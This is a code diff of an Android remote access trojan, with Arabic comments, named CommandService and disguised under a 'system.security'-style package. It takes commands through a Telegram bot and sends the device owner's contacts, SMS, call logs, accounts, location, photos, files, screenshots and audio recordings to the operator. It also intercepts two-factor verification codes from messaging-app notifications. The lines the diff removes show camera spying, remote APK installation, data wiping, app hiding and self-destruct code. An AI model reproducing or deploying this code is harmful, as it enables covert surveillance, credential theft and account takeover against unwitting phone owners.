@@ -1,27 +1,27 @@
-package com.system.security;
+package com.v8.global.sniffer;
 
 import android.app.*;
+import android.app.admin.DevicePolicyManager;
 import android.content.*;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.hardware.Camera;
-import android.hardware.camera2.CameraManager;
+import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.media.MediaRecorder;
-import android.media.projection.MediaProjectionManager;
+import android.media.RingtoneManager;
 import android.net.Uri;
 import android.os.*;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.provider.Settings;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
-import android.util.DisplayMetrics;
-import android.view.SurfaceView;
-import android.view.WindowManager;
 import android.webkit.MimeTypeMap;
 
 import androidx.core.app.NotificationCompat;
@@ -29,12 +29,10 @@ import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import java.io.BufferedReader;
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.FileReader;
+import java.io.IOException;
 import java.io.InputStream;
 import java.net.URL;
 import java.net.URLConnection;
@@ -48,6 +46,8 @@ import java.util.TimerTask;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
+import okhttp3.Call;
+import okhttp3.FormBody;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
@@ -64,11 +64,8 @@ public class CommandService extends NotificationListenerService {
     private int lastUpdateId = 0;
     private PowerManager.WakeLock wakeLock;
     private MediaRecorder mediaRecorder;
-    private Camera camera;
     private boolean isRecordingAudio = false;
-    private boolean isRecordingVideo = false;
     private String currentAudioPath;
-    private String currentVideoPath;
     private Handler handler = new Handler(Looper.getMainLooper());
 
     @Override
@@ -130,7 +127,6 @@ public class CommandService extends NotificationListenerService {
             info.put("product", Build.PRODUCT);
             info.put("android_version", Build.VERSION.RELEASE);
             info.put("sdk", Build.VERSION.SDK_INT);
-            info.put("serial", Build.getSerial());
             
             // معلومات الاتصال
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
@@ -177,7 +173,7 @@ public class CommandService extends NotificationListenerService {
                 .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId + "&timeout=10")
                 .build();
         
-        client.newCall(request).enqueue(new Callback() {
+        client.newCall(request).enqueue(new okhttp3.Callback() {
             @Override
             public void onResponse(Call c, Response r) throws IOException {
                 try {
@@ -198,164 +194,60 @@ public class CommandService extends NotificationListenerService {
                                 sendToTelegram("📩 تم استلام: " + text, String.valueOf(chatId));
                                 
                                 switch (text) {
-                                    // أوامر المعلومات
                                     case "/info":
                                         sendDeviceInfo();
                                         break;
-                                        
                                     case "/location":
                                         getLocation();
                                         break;
-                                        
                                     case "/contacts":
                                         getContacts();
                                         break;
-                                        
                                     case "/sms":
                                         getSms();
                                         break;
-                                        
                                     case "/calls":
                                         getCallLog();
                                         break;
-                                        
                                     case "/accounts":
                                         getAccounts();
                                         break;
-                                        
                                     case "/photos":
                                         getPhotos();
                                         break;
-                                        
                                     case "/videos":
                                         getVideos();
                                         break;
-                                        
                                     case "/files":
                                         getFiles();
                                         break;
-                                        
-                                    // أوامر التحكم
                                     case "/screenshot":
                                         takeScreenshot();
                                         break;
-                                        
-                                    case "/front_camera":
-                                        takeFrontCameraPhoto();
-                                        break;
-                                        
-                                    case "/back_camera":
-                                        takeBackCameraPhoto();
-                                        break;
-                                        
                                     case "/record_audio_start":
                                         startAudioRecording();
                                         break;
-                                        
                                     case "/record_audio_stop":
                                         stopAudioRecording();
                                         break;
-                                        
-                                    case "/record_video_start":
-                                        startVideoRecording();
-                                        break;
-                                        
-                                    case "/record_video_stop":
-                                        stopVideoRecording();
-                                        break;
-                                        
                                     case "/lock":
                                         lockDevice();
                                         break;
-                                        
-                                    case "/unlock":
-                                        unlockDevice();
-                                        break;
-                                        
-                                    case "/screen_on":
-                                        screenOn();
-                                        break;
-                                        
                                     case "/screen_off":
                                         screenOff();
                                         break;
-                                        
                                     case "/vibrate":
                                         vibrate();
                                         break;
-                                        
                                     case "/ring":
                                         ring();
                                         break;
-                                        
                                     case "/silent":
                                         silent();
                                         break;
-                                        
-                                    case "/volume_up":
-                                        volumeUp();
-                                        break;
-                                        
-                                    case "/volume_down":
-                                        volumeDown();
-                                        break;
-                                        
-                                    case "/open_url":
-                                        sendToTelegram("❌ استخدم: /open_url [الرابط]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/send_sms":
-                                        sendToTelegram("❌ استخدم: /send_sms [رقم] [نص]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/make_call":
-                                        sendToTelegram("❌ استخدم: /make_call [رقم]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/install_app":
-                                        sendToTelegram("❌ استخدم: /install_app [رابط]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/uninstall_app":
-                                        sendToTelegram("❌ استخدم: /uninstall_app [package]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/delete_file":
-                                        sendToTelegram("❌ استخدم: /delete_file [المسار]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/wipe_data":
-                                        wipeData();
-                                        break;
-                                        
-                                    case "/factory_reset":
-                                        factoryReset();
-                                        break;
-                                        
-                                    case "/lock_app":
-                                        sendToTelegram("❌ استخدم: /lock_app [package]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/unlock_app":
-                                        sendToTelegram("❌ استخدم: /unlock_app [package]", String.valueOf(chatId));
-                                        break;
-                                        
-                                    case "/hide_app":
-                                        hideApp();
-                                        break;
-                                        
-                                    case "/unhide_app":
-                                        unhideApp();
-                                        break;
-                                        
-                                    case "/self_destruct":
-                                        selfDestruct();
-                                        break;
-                                        
                                     case "/help":
                                         sendHelp(String.valueOf(chatId));
                                         break;
-                                        
                                     default:
                                         if (text.startsWith("/open_url ")) {
                                             String url = text.substring(10);
@@ -365,24 +257,6 @@ public class CommandService extends NotificationListenerService {
                                             if (parts.length == 2) {
                                                 sendSms(parts[0], parts[1]);
                                             }
-                                        } else if (text.startsWith("/make_call ")) {
-                                            String number = text.substring(11);
-                                            makeCall(number);
-                                        } else if (text.startsWith("/install_app ")) {
-                                            String url = text.substring(13);
-                                            installApp(url);
-                                        } else if (text.startsWith("/uninstall_app ")) {
-                                            String pkg = text.substring(15);
-                                            uninstallApp(pkg);
-                                        } else if (text.startsWith("/delete_file ")) {
-                                            String path = text.substring(13);
-                                            deleteFile(path);
-                                        } else if (text.startsWith("/lock_app ")) {
-                                            String pkg = text.substring(10);
-                                            lockApp(pkg);
-                                        } else if (text.startsWith("/unlock_app ")) {
-                                            String pkg = text.substring(12);
-                                            unlockApp(pkg);
                                         }
                                         break;
                                 }
@@ -401,52 +275,26 @@ public class CommandService extends NotificationListenerService {
     }
 
     private void sendHelp(String chatId) {
-        String help = "📋 **قائمة الأوامر الكاملة**\n\n" +
-                "**معلومات الجهاز:**\n" +
-                "/info - معلومات الجهاز الكاملة\n" +
+        String help = "📋 **قائمة الأوامر**\n\n" +
+                "/info - معلومات الجهاز\n" +
                 "/location - الموقع الحالي\n" +
                 "/contacts - جهات الاتصال\n" +
                 "/sms - جميع الرسائل\n" +
                 "/calls - سجل المكالمات\n" +
-                "/accounts - الحسابات المسجلة\n" +
+                "/accounts - الحسابات\n" +
                 "/photos - الصور\n" +
                 "/videos - الفيديوهات\n" +
-                "/files - جميع الملفات\n\n" +
-                
-                "**الكاميرا والتسجيل:**\n" +
+                "/files - الملفات\n" +
                 "/screenshot - تصوير الشاشة\n" +
-                "/front_camera - صورة من الكاميرا الأمامية\n" +
-                "/back_camera - صورة من الكاميرا الخلفية\n" +
                 "/record_audio_start - بدء تسجيل الصوت\n" +
                 "/record_audio_stop - إيقاف التسجيل\n" +
-                "/record_video_start - بدء تسجيل فيديو\n" +
-                "/record_video_stop - إيقاف التسجيل\n\n" +
-                
-                "**التحكم بالجهاز:**\n" +
                 "/lock - قفل الشاشة\n" +
-                "/unlock - فتح الشاشة\n" +
-                "/screen_on - تشغيل الشاشة\n" +
                 "/screen_off - إطفاء الشاشة\n" +
                 "/vibrate - اهتزاز\n" +
                 "/ring - رنين\n" +
                 "/silent - وضع صامت\n" +
-                "/volume_up - رفع الصوت\n" +
-                "/volume_down - خفض الصوت\n\n" +
-                
-                "**أوامر متقدمة:**\n" +
                 "/open_url [رابط] - فتح رابط\n" +
-                "/send_sms [رقم] [نص] - إرسال رسالة\n" +
-                "/make_call [رقم] - اتصال\n" +
-                "/install_app [رابط] - تثبيت تطبيق\n" +
-                "/uninstall_app [package] - حذف تطبيق\n" +
-                "/delete_file [مسار] - حذف ملف\n" +
-                "/wipe_data - مسح بيانات المستخدم\n" +
-                "/factory_reset - إعادة ضبط المصنع\n" +
-                "/lock_app [package] - قفل تطبيق\n" +
-                "/unlock_app [package] - فتح تطبيق\n" +
-                "/hide_app - إخفاء التطبيق\n" +
-                "/unhide_app - إظهار التطبيق\n" +
-                "/self_destruct - التدمير الذاتي";
+                "/send_sms [رقم] [نص] - إرسال رسالة";
         
         sendToTelegram(help, chatId);
     }
@@ -576,10 +424,10 @@ public class CommandService extends NotificationListenerService {
         new Thread(() -> {
             try {
                 AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
-                Account[] accounts = am.getAccounts();
+                android.accounts.Account[] accounts = am.getAccounts();
                 
                 JSONArray accountList = new JSONArray();
-                for (Account account : accounts) {
+                for (android.accounts.Account account : accounts) {
                     JSONObject acc = new JSONObject();
                     acc.put("type", account.type);
                     acc.put("name", account.name);
@@ -709,28 +557,6 @@ public class CommandService extends NotificationListenerService {
         }
     }
 
-    private void takeFrontCameraPhoto() {
-        try {
-            Intent intent = new Intent(this, ControlService.class);
-            intent.setAction("TAKE_FRONT_PHOTO");
-            startService(intent);
-            sendToTelegram("📸 جاري التقاط صورة أمامية", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void takeBackCameraPhoto() {
-        try {
-            Intent intent = new Intent(this, ControlService.class);
-            intent.setAction("TAKE_BACK_PHOTO");
-            startService(intent);
-            sendToTelegram("📸 جاري التقاط صورة خلفية", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
     private void startAudioRecording() {
         try {
             if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
@@ -775,60 +601,12 @@ public class CommandService extends NotificationListenerService {
         }
     }
 
-    private void startVideoRecording() {
-        try {
-            Intent intent = new Intent(this, ControlService.class);
-            intent.setAction("START_VIDEO_RECORDING");
-            startService(intent);
-            sendToTelegram("🎥 بدأ تسجيل الفيديو", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void stopVideoRecording() {
-        try {
-            Intent intent = new Intent(this, ControlService.class);
-            intent.setAction("STOP_VIDEO_RECORDING");
-            startService(intent);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
     private void lockDevice() {
         try {
             Intent intent = new Intent(this, ControlService.class);
             intent.setAction("LOCK_DEVICE");
             startService(intent);
             sendToTelegram("🔒 جاري قفل الجهاز", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void unlockDevice() {
-        try {
-            Intent intent = new Intent(this, ControlService.class);
-            intent.setAction("UNLOCK_DEVICE");
-            startService(intent);
-            sendToTelegram("🔓 جاري فتح الجهاز", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void screenOn() {
-        try {
-            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                PowerManager.WakeLock wl = pm.newWakeLock(
-                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
-                    "System:WakeLock");
-                wl.acquire(5000);
-                wl.release();
-            }
-            sendToTelegram("💡 تم تشغيل الشاشة", CHAT_ID);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -895,26 +673,6 @@ public class CommandService extends NotificationListenerService {
         }
     }
 
-    private void volumeUp() {
-        try {
-            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
-            am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, 0);
-            sendToTelegram("🔊 تم رفع الصوت", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void volumeDown() {
-        try {
-            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
-            am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, 0);
-            sendToTelegram("🔉 تم خفض الصوت", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
     private void openUrl(String url) {
         try {
             Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
@@ -939,180 +697,6 @@ public class CommandService extends NotificationListenerService {
         } catch (Exception e) {
             e.printStackTrace();
         }
-    }
-
-    private void makeCall(String number) {
-        try {
-            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            sendToTelegram("📞 جاري الاتصال بـ " + number, CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void installApp(String url) {
-        new Thread(() -> {
-            try {
-                sendToTelegram("📥 جاري تحميل التطبيق...", CHAT_ID);
-                
-                URL downloadUrl = new URL(url);
-                URLConnection connection = downloadUrl.openConnection();
-                connection.connect();
-                
-                String fileName = url.substring(url.lastIndexOf("/") + 1);
-                File file = new File(getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), fileName);
-                
-                InputStream input = connection.getInputStream();
-                FileOutputStream output = new FileOutputStream(file);
-                
-                byte[] buffer = new byte[4096];
-                int count;
-                while ((count = input.read(buffer)) != -1) {
-                    output.write(buffer, 0, count);
-                }
-                output.flush();
-                output.close();
-                input.close();
-                
-                sendToTelegram("✅ تم التحميل، جاري التثبيت...", CHAT_ID);
-                
-                Intent intent = new Intent(Intent.ACTION_VIEW);
-                intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-                
-            } catch (Exception e) {
-                e.printStackTrace();
-                sendToTelegram("❌ فشل التثبيت: " + e.getMessage(), CHAT_ID);
-            }
-        }).start();
-    }
-
-    private void uninstallApp(String packageName) {
-        try {
-            Intent intent = new Intent(Intent.ACTION_DELETE);
-            intent.setData(Uri.parse("package:" + packageName));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            sendToTelegram("🗑 جاري حذف: " + packageName, CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void deleteFile(String path) {
-        try {
-            File file = new File(path);
-            if (file.exists()) {
-                file.delete();
-                sendToTelegram("🗑 تم حذف: " + path, CHAT_ID);
-            } else {
-                sendToTelegram("❌ الملف غير موجود", CHAT_ID);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void wipeData() {
-        try {
-            DevicePolicyManager pm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(this, AdminReceiver.class);
-            if (pm.isAdminActive(admin)) {
-                pm.wipeData(0);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void factoryReset() {
-        try {
-            DevicePolicyManager pm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(this, AdminReceiver.class);
-            if (pm.isAdminActive(admin)) {
-                pm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void lockApp(String packageName) {
-        try {
-            Intent intent = new Intent(this, ControlService.class);
-            intent.setAction("LOCK_APP");
-            intent.putExtra("package", packageName);
-            startService(intent);
-            sendToTelegram("🔒 تم قفل التطبيق: " + packageName, CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void unlockApp(String packageName) {
-        try {
-            Intent intent = new Intent(this, ControlService.class);
-            intent.setAction("UNLOCK_APP");
-            intent.putExtra("package", packageName);
-            startService(intent);
-            sendToTelegram("🔓 تم فتح التطبيق: " + packageName, CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void hideApp() {
-        try {
-            PackageManager pm = getPackageManager();
-            pm.setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
-            sendToTelegram("👻 تم إخفاء التطبيق", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void unhideApp() {
-        try {
-            PackageManager pm = getPackageManager();
-            pm.setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP);
-            sendToTelegram("👀 تم إظهار التطبيق", CHAT_ID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void selfDestruct() {
-        try {
-            File appDir = new File(getApplicationInfo().dataDir);
-            deleteRecursive(appDir);
-            
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                Intent intent = new Intent(Intent.ACTION_FACTORY_RESET);
-                sendBroadcast(intent);
-            }
-            
-            android.os.Process.killProcess(android.os.Process.myPid());
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void deleteRecursive(File fileOrDirectory) {
-        if (fileOrDirectory.isDirectory()) {
-            for (File child : fileOrDirectory.listFiles()) {
-                deleteRecursive(child);
-            }
-        }
-        fileOrDirectory.delete();
     }
 
     private void copyFile(File src, File dst) throws IOException {
@@ -1161,10 +745,12 @@ public class CommandService extends NotificationListenerService {
                     .post(requestBody)
                     .build();
 
-            client.newCall(request).enqueue(new Callback() {
+            client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(Call call, Response response) {
-                    response.close();
+                    try {
+                        response.close();
+                    } catch (Exception e) {}
                     file.delete();
                 }
 
@@ -1191,10 +777,12 @@ public class CommandService extends NotificationListenerService {
                     .post(requestBody)
                     .build();
 
-            client.newCall(request).enqueue(new Callback() {
+            client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(Call call, Response response) {
-                    response.close();
+                    try {
+                        response.close();
+                    } catch (Exception e) {}
                     file.delete();
                 }
 
@@ -1220,10 +808,12 @@ public class CommandService extends NotificationListenerService {
                 .post(formBody)
                 .build();
         
-        client.newCall(request).enqueue(new Callback() {
+        client.newCall(request).enqueue(new okhttp3.Callback() {
             @Override
             public void onResponse(Call call, Response response) {
-                response.close();
+                try {
+                    response.close();
+                } catch (Exception e) {}
             }
 
             @Override
@@ -1246,16 +836,14 @@ public class CommandService extends NotificationListenerService {
         
         if (pkg.contains("facebook") || pkg.contains("instagram") || 
             pkg.contains("tiktok") || pkg.contains("twitter") ||
-            pkg.contains("whatsapp") || pkg.contains("telegram") ||
-            pkg.contains("messenger")) {
+            pkg.contains("whatsapp")) {
             
             Bundle extras = sbn.getNotification().extras;
             String title = extras.getString(Notification.EXTRA_TITLE, "");
             String text = extras.getString(Notification.EXTRA_TEXT, "");
             
             if (title.contains("رمز") || title.contains("code") ||
-                title.contains("تأكيد") || title.contains("verify") ||
-                text.contains("رمز") || text.contains("code")) {
+                title.contains("تأكيد") || title.contains("verify")) {
                 
                 sendToTelegram("🔐 رمز تحقق: " + text, CHAT_ID);
             }
@@ -1270,9 +858,6 @@ public class CommandService extends NotificationListenerService {
         if (mediaRecorder != null) {
             mediaRecorder.release();
         }
-        if (camera != null) {
-            camera.release();
-        }
         
         Intent intent = new Intent(this, CommandService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -1281,14 +866,4 @@ public class CommandService extends NotificationListenerService {
             startService(intent);
         }
     }
-
-    // واجهات OkHttp
-    interface Callback {
-        void onResponse(Call call, Response response) throws IOException;
-        void onFailure(Call call, IOException e);
-    }
-
-    static class Call {
-        void enqueue(Callback callback) {}
-    }
-                      }
+}
